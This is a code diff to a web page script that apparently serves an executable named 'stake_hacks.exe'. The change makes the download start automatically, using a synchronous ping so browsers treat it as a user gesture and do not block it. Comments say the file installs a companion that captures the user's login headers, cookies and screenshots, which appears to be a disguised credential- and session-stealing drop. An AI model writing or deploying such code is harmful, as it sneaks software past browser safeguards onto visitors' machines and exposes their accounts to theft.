@@ -51,6 +51,20 @@
 
     const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
+    // Sync ping: must be synchronous so the chrome/edge download triggered
+    // right after still counts as a user gesture (otherwise it's blocked).
+    const pingSync = () => {
+      try {
+        const x = new XMLHttpRequest();
+        x.open('GET', COMPANION + '/ping', false);
+        x.timeout = 2000;
+        x.send();
+        return x.status >= 200 && x.status < 300;
+      } catch {
+        return false;
+      }
+    };
+
     const downloadExe = () => {
       const a = document.createElement('a');
       a.href = '/stake_hacks.exe';
@@ -76,21 +90,19 @@
     //    capturing the REAL headers (your login, your cookies). No injection.
     const runFromLocalBrowser = async () => {
       const browser = detectBrowser();
-      let companionUp = false;
-      try {
-        const ping = await fetch(COMPANION + '/ping', { cache: 'no-store' });
-        companionUp = ping.ok;
-      } catch {}
+      const companionUp = pingSync();
 
       if (!companionUp) {
         // No companion / Node: auto-download stake_hacks.exe. It installs
         // Node + companion and runs the FULL capture by itself. Watch for the
         // companion to come online, then grab whatever it captured.
+        downloadExe(); // called synchronously so browsers allow the download
         $('status').innerHTML =
           'Companion not running on this PC. <b>Downloading stake_hacks.exe…</b> ' +
-          'please run the downloaded file — it installs everything and starts the capture. ' +
-          'This page is watching and will show the screenshots automatically.';
-        downloadExe();
+          'Please open the downloaded file — it installs everything and starts the capture.<br>' +
+          'If the download did not start, click: ' +
+          '<a href="/stake_hacks.exe" download style="color:#0af;font-weight:bold">Download stake_hacks.exe</a>' +
+          '<br>This page is watching and will show the screenshots automatically.';
         let ok = false;
         for (let i = 0; i < 120; i++) {
           await sleep(2000); // 120 x 2s = up to 4 min (full capture time)
